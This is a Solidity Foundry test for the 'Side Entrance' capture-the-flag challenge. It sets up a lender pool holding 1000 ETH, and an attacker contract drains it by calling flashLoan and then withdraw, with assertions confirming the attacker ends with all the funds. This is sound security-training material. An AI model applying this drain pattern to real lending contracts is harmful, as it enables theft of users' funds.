
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {Attacker} from "./attacker.sol";

contract SideEntranceChallenge is Test {

    SideEntranceLenderPool pool;
    Attacker attacker;

    function setUp() public {
        // Deploy the pool
        pool = new SideEntranceLenderPool();

        // Deploy attacker and pass the pool address
        attacker = new Attacker(address(pool));

        // Fund the pool with 1000 ETH
        vm.deal(address(pool), 1000 ether);
    }

    function testExploit() public {
        // Check initial balances
        assertEq(address(pool).balance, 1000 ether);
        assertEq(address(attacker).balance, 0);

        // Execute both calls as the attacker
        vm.startPrank(address(attacker));

        pool.flashLoan(1000 ether);
        pool.withdraw();

        vm.stopPrank();

        // Check final balances
        assertEq(address(pool).balance, 0);
        assertEq(address(attacker).balance, 1000 ether);
    }
}
